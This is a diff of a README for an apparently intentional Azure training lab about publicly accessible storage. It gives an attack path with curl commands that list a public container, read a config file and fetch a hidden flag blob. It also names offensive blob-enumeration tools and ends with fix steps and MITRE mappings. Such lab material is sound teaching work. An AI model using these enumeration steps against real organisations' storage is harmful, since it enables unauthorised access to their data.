@@ -1,37 +1,78 @@
-# Vulnerable Application Information
+# Storage Account Public Access
 
-In this vulnerable application, two storage accounts have been created: one for the development environment and one for the production environment. Due to the requirement for globally unique storage account names, both accounts have been appended with a unique ID. While both storage accounts allow public access, access is restricted based on the attacker's public IP for security reasons. The development storage account hosts a public static website, indicating the removal of the production website due to issues.
+**Difficulty:** Beginner | **Provider:** Azure | **Category:** Storage Misconfiguration
 
-Organizations often employ various deployment environments, such as:
-- Development (DEV)
-- Testing (TST)
-- User Acceptance Testing (UAT)
-- Performance Testing (PTP)
-- Production (PRD)
+## Scenario
 
-Since the storage account names end with "dev," an attacker might attempt to identify storage accounts associated with other environment acronyms, such as "prd."
+A company hosts two Azure Storage accounts: a public static website (`*dev`) and a
+production account (`*prd`). The production account has a container named `website` with
+**container-level** public access (blobs can be listed) and a container named `secrets`
+with **blob-level** access (individual blobs can be fetched by direct URL, but the
+container cannot be listed).
 
-The second storage account contains two containers:
-1. The "website" container has a public access level set to "container."
-2. The "secrets" container has a public access level set to "blob."
+The `website` container holds a `config.cfg` file that references the path to `flag.txt`
+in the `secrets` container.
 
-This means that the contents of the first container can be enumerated, while the contents of the second container cannot be accessed without providing the specific container and blob names.
+## Attack Path
 
-Using open source tools (listed below), it is possible to list public storage accounts and their containers. This enables attackers to identify files within the "website" container, including a configuration file containing variables like the URL to the "secrets" container. Additionally, a NodeJS file appends the container URL with the blob's name, "flag.txt." Armed with this information, attackers can gain access to the "hidden" blob.
+```
+[Attacker]
+    |
+    v
+Enumerate storage accounts (*dev / *prd naming pattern)
+    |
+    v
+List blobs in 'website' container (container-level access)
+    |
+    v
+Read config.cfg  -->  reveals URL of 'secrets' container
+    |
+    v
+Construct direct URL: <storage>.blob.core.windows.net/secrets/flag.txt
+    |
+    v
+Flag
+```
 
-## Offensive Tools:
+### Step 1 — Enumerate storage accounts
 
-For offensive scenarios, the following open source tools can be employed:
+```bash
+# Replace XXXX with the unique ID shown after deployment
+curl "https://cumulonimbusXXXXprd.blob.core.windows.net/website?restype=container&comp=list"
+```
 
-- [cloud_enum](https://github.com/initstring/cloud_enum)
+### Step 2 — Read config.cfg
+
+```bash
+curl "https://cumulonimbusXXXXprd.blob.core.windows.net/website/config.cfg"
+```
+
+### Step 3 — Fetch the flag
+
+```bash
+curl "https://cumulonimbusXXXXprd.blob.core.windows.net/secrets/flag.txt"
+```
+
+## Offensive Tools
+
+- [cloud-enum](https://github.com/initstring/cloud_enum)
 - [BlobHunter](https://github.com/cyberark/BlobHunter)
 - [Az-Blob-Attacker](https://github.com/VitthalS/Az-Blob-Attacker)
-- [Microburst](https://github.com/NetSPI/MicroBurst)
+- [MicroBurst](https://github.com/NetSPI/MicroBurst)
 - [basicblobfinder](https://github.com/joswr1ght/basicblobfinder)
 
+## How to Fix in Production
 
-## ⚠️ Warning
+1. **Disable anonymous blob access** at the storage account level
+   (`allow_blob_public_access = false` in Terraform / "Allow Blob Anonymous Access" = Disabled in the portal).
+   This overrides any container-level setting.
+2. **Never store path hints in publicly readable blobs** — config files containing
+   internal paths defeat the purpose of blob-level access controls.
+3. Use **Azure Policy** to audit and deny storage accounts with public access enabled.
 
-**Important:** Details regarding the attack, safeguards, and methods for identifying this vulnerability, weakness, or misconfiguration are available in the PDF document.
+## MITRE ATT&CK Mapping
 
----
+| Technique | ID |
+|---|---|
+| Cloud Storage Object Discovery | T1619 |
+| Data from Cloud Storage | T1530 |
